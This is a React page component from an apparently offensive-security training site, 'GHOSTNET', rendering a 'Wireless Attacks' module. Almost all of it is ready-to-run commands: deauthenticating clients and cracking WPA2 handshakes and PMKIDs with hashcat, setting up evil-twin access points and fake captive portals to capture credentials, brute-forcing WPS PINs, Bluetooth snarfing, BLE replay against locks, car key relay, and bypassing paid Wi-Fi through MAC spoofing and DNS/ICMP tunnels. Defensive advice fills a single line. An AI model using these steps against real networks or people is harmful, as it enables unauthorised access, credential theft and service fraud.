'use client'
import React from 'react'
import Link from 'next/link'

const accent = '#aaff00'
const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a6a3a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#060800', border: `1px solid #2a3800`, borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)
const H2 = ({ children }: { children: React.ReactNode }) => (
  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 600, color: accent, marginTop: '3rem', marginBottom: '1rem' }}>
    <span style={{ color: '#2a3800', marginRight: '8px' }}>//</span>{children}
  </h2>
)

export default function WirelessAttacks() {
  return (
    <div>
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a6a3a' }}>
        <Link href="/" style={{ color: '#5a6a3a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>›</span><span style={{ color: accent }}>WIRELESS ATTACKS</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <span style={{ padding: '3px 10px', background: `rgba(170,255,0,0.08)`, border: `1px solid rgba(170,255,0,0.3)`, borderRadius: '3px', color: accent, fontSize: '8px' }}>CONCEPT</span>
          <Link href="/modules/wireless-attacks/lab" style={{ textDecoration: 'none', padding: '3px 10px', border: '1px solid #1a2010', borderRadius: '3px', color: '#5a6a3a', fontSize: '8px' }}>LAB →</Link>
        </div>
      </div>

      <div style={{ marginBottom: '2.5rem' }}>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: accent, margin: '0.5rem 0', textShadow: `0 0 20px rgba(170,255,0,0.35)` }}>WIRELESS ATTACKS</h1>
        <p style={{ color: '#5a6a3a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>WPA2 cracking · Evil twin · PMKID · Deauth attacks · WPS exploitation · Bluetooth · RFID · Captive portal bypass</p>
      </div>

      <H2>01 — Wireless Setup</H2>
      <Pre label="// HARDWARE AND SOFTWARE REQUIREMENTS">{`# Wireless adapter with monitor mode + packet injection:
# Recommended: Alfa AWUS036ACH, AWUS036AXML
# Check: iw list | grep "monitor"

# Enable monitor mode:
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
# Or with airmon-ng:
sudo airmon-ng start wlan0  # Creates wlan0mon

# Kill interfering processes:
sudo airmon-ng check kill

# Verify monitor mode:
iwconfig wlan0mon

# Install tools:
sudo apt install aircrack-ng hashcat hcxtools hcxdumptool wireshark`}</Pre>

      <H2>02 — WPA2 Cracking</H2>
      <Pre label="// CAPTURE AND CRACK WPA2 HANDSHAKE">{`# Step 1: Scan for networks
sudo airodump-ng wlan0mon
# Note: BSSID (AP MAC), Channel, ESSID (network name)

# Step 2: Target specific AP and capture handshake
sudo airodump-ng -c CHANNEL --bssid AP_BSSID -w capture wlan0mon
# Wait for client to connect naturally (slow) OR deauth attack (fast)

# Step 3: Deauth attack — force client to reconnect
sudo aireplay-ng --deauth 10 -a AP_BSSID -c CLIENT_MAC wlan0mon
# Client disconnects → reconnects → you capture handshake
# Wireshark shows: EAPOL packets = handshake captured

# Step 4: Crack with aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Step 4 (better): Crack with hashcat (GPU accelerated)
# Convert capture to hashcat format:
hcxpcapngtool -o hash.hc22000 capture-01.cap
# Crack:
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
# With rules:
hashcat -m 22000 hash.hc22000 rockyou.txt -r rules/best64.rule

# If password not in wordlist — custom wordlist:
# Target uses company name + numbers?
# crunch 8 12 0123456789abcdefABCDEF -o custom.txt
# Or: cewl target.com -d 3 -m 6 > cewl.txt  (words from their website)`}</Pre>

      <H2>03 — PMKID Attack (No Client Needed)</H2>
      <Pre label="// CRACK WPA2 WITHOUT WAITING FOR HANDSHAKE">{`# PMKID is derived from: PMKID = HMAC-SHA1(PMK, "PMK Name" || AP_MAC || CLIENT_MAC)
# Contained in first EAPOL frame from AP
# No need to wait for or force a client connection!

# Capture PMKID:
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Wait for PMKID captures (usually seconds per AP)
# Convert:
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Crack (same as WPA2 handshake):
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt

# Target specific AP:
sudo hcxdumptool -i wlan0mon --filterlist_ap=BSSID.txt --filtermode=2 -o pmkid.pcapng`}</Pre>

      <H2>04 — Evil Twin Attack</H2>
      <Pre label="// CREATE FAKE ACCESS POINT — STEAL CREDENTIALS">{`# Evil Twin = clone legitimate AP → lure users to connect
# When they authenticate → capture credentials

# Method 1: hostapd-wpe (WPA Enterprise evil twin)
sudo apt install hostapd-wpe
# Config /etc/hostapd-wpe/hostapd-wpe.conf:
echo 'interface=wlan0mon
driver=nl80211
ssid=Corporate-WiFi
channel=6
wpa=3
wpa_key_mgmt=WPA-EAP
ieee8021x=1' | sudo tee /etc/hostapd-wpe/hostapd-wpe.conf
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# Credentials logged to /var/log/hostapd-wpe.log

# Method 2: WiFi-Pumpkin3 (modern, GUI)
pip install wifi-pumpkin3
wifi-pumpkin3

# Method 3: Airbase-ng + captive portal
# 1. Create AP:
sudo airbase-ng -e "Free_Airport_WiFi" -c 6 wlan0mon
# 2. Configure bridge and DHCP server
# 3. Host fake captive portal on your machine
# 4. Victims connect → redirected to fake portal
# 5. Capture submitted credentials

# Method 4: Bettercap (comprehensive)
sudo bettercap
# Create AP:
set wifi.ap.ssid FreeWifi
set wifi.ap.bssid de:ad:be:ef:de:ad
set wifi.ap.channel 6
wifi.recon on
wifi.ap on`}</Pre>

      <H2>05 — WPS Exploitation</H2>
      <Pre label="// BREAK WPS PIN IN HOURS">{`# WPS (WiFi Protected Setup) PIN is 8 digits
# Split into two 4-digit halves checked separately
# Brute force space: 11,000 combinations (not 100,000,000)
# Many routers have NO lockout → trivially crackable

# Scan for WPS-enabled APs:
sudo wash -i wlan0mon
# Look for: WPS Locked = No (vulnerable)

# Reaver attack:
sudo apt install reaver
sudo reaver -i wlan0mon -b AP_BSSID -vv

# Pixie Dust attack (faster, works on many routers):
sudo reaver -i wlan0mon -b AP_BSSID -vv -K 1
# Many routers have weak random number generation
# Pixie dust exploits this to recover PIN in seconds

# Bully (alternative):
sudo apt install bully
sudo bully wlan0mon -b AP_BSSID -d -v 3

# Defence: Disable WPS in router settings
# It provides no real benefit and is a serious security risk`}</Pre>

      <H2>06 — Bluetooth Attacks</H2>
      <Pre label="// BLUETOOTH EXPLOITATION BASICS">{`# Tools:
sudo apt install bluez bluetooth blueman
sudo apt install bluehydra  # BT recon
pip install bleak  # Python BT library

# Scan for Bluetooth devices:
hcitool scan         # Classic BT
sudo hcitool lescan  # BLE (Low Energy)
bluetoothctl scan on

# BlueSnarf — read phonebook from old devices:
sudo apt install bluez-utils
# obexftp -b DEVICE_MAC -B 10 -g telecom/pb.vcf

# BlueBorne (CVE-2017-1000251):
# RCE via Bluetooth without pairing
# Affects Linux, Android, Windows, iOS
# Patched but many unpatched devices exist
# PoC: https://github.com/ArmisSecurity/blueborne

# BLE Sniffing (IoT devices):
# Many BLE devices send sensitive data unencrypted
sudo apt install ubertooth  # Hardware: Ubertooth One
ubertooth-btle -f -t DEVICE_MAC  # Follow specific device

# Replay attacks on BLE:
# Record garage door, door lock signal
# Replay to open door
# gatttool -b DEVICE_MAC --char-write-req -a HANDLE -n VALUE

# Car key fob relay attack:
# Two people: one near car, one near key inside house
# Relay signal between them → car unlocks
# Hardware: relay attack device (~$100)`}</Pre>

      <H2>07 — Captive Portal Bypass</H2>
      <Pre label="// BYPASS HOTEL / AIRPORT / CAFE WIFI RESTRICTIONS">{`# Method 1: MAC Address Spoofing
# Find a connected client's MAC via packet sniffing
# Change your MAC to match → you're "already paid"

# Find connected client:
sudo airodump-ng wlan0mon
# Note a STATION (client) MAC that's connected to the AP

# Spoof your MAC:
sudo ip link set wlan0 down
sudo ip link set wlan0 address AA:BB:CC:DD:EE:FF  # Use found MAC
sudo ip link set wlan0 up

# Method 2: DNS Tunneling
# Most captive portals allow DNS traffic before auth
# Tunnel all traffic over DNS queries

# iodine — DNS tunnel:
# Server side (your VPS):
sudo iodined -f -c -P password 10.0.0.1 tunnel.yourdomain.com
# Client side:
sudo iodine -f -P password tunnel.yourdomain.com
# Now route traffic through tunnel interface (dns0)

# Method 3: ICMP Tunnel
# Some portals allow ICMP (ping)
# Hans — ICMP tunnel:
# Server: sudo hans -s 10.0.0.1 -p password
# Client: sudo hans -c SERVER_IP -p password

# Method 4: HTTP CONNECT proxy bypass
# If port 443 open before auth → SSL tunnel
ssh -p 443 user@YOUR_VPS -D 1080  # SOCKS proxy over port 443
# Then: configure browser to use localhost:1080 as SOCKS proxy`}</Pre>

      <div style={{ marginTop: '4rem', paddingTop: '2rem', borderTop: `1px solid #2a3800`, display: 'flex', justifyContent: 'space-between' }}>
        <Link href="/" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a6a3a' }}>← DASHBOARD</Link>
        <Link href="/modules/wireless-attacks/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: accent, padding: '8px 20px', border: `1px solid rgba(170,255,0,0.4)`, borderRadius: '4px', background: `rgba(170,255,0,0.06)` }}>PROCEED TO LAB →</Link>
      </div>
    </div>
  )
}
